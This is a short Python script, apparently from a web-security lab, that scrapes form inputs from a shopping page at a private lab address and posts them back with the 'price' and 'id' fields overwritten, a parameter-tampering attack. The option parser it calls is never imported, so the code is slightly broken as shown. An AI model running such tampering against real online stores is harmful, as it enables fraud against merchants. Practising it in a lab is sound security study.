#!/usr/bin/env python3 -tt
#-*- coding: utf-8 -*-
import re
import requests as _r # messing around with imports, and import aliases
"""
        This program is used to search for form names utilized in POST data in order to tamper with the given tag names.
        This could be modified to be fully independent from the current host this was tested against.
"""

def main():
    VERBOSE=1

    url=b''
    regex_s=r'\<form method="POST">.+</form'
    
    parser=op('usage: %prog -u <URL> -v <VERBOSE_0_or_1>')
    parser.add_option(
        '-u',
        '--url',
        dest='url',
        help='URL to tamper with'
    )
    
    parser.add_option(
        '-v',
        '--verbose',
        dest='verbose',
        help='turn on verboseness'
    )

    
    (options,args) = parser.parse_args()

    if options.url == None:

        print("Missing url paramater: {}".format(parser.usage))
        exit()

    else:

        if options.verbose:
            VERBOSE = options.verbose

        url=options.url.encode('latin-1')
    # setup
    # python3 paramtamp.py -u http://192.168.1.161/security/5/buy.php
    
    sesh=_r.session()
    resp=sesh.get(url.decode())

    print("GET url: {}\n\nGET response: {}\n\nSession headers: {}\n\n".format(url,resp.content,resp.headers))
    #print(re.findall(r'<input\stype=.+\>',resp.content.decode()))
    matched_list=re.findall(r'<input type=(.+)\s/>',resp.content.decode()) #find the form items in the HTML tags

    d={}

    for i in matched_list:
        key_=i.split(' ')[1].split('=')[1].replace('"', '')# create a dictionary key
        val_=i.split(' ')[2].split('=')[1].replace('"', '')# create a dictionary value
        d.update({key_:val_}) # update dictionary with key:value pair
    
    d['price']='haha, got \'em' # tamper with params
    d['id']='deez nutz!' # tamper with params

    resp=sesh.post(url,d) # send post data
    print(resp.content) # print server response.
    
if __name__ == '__main__':
	main()
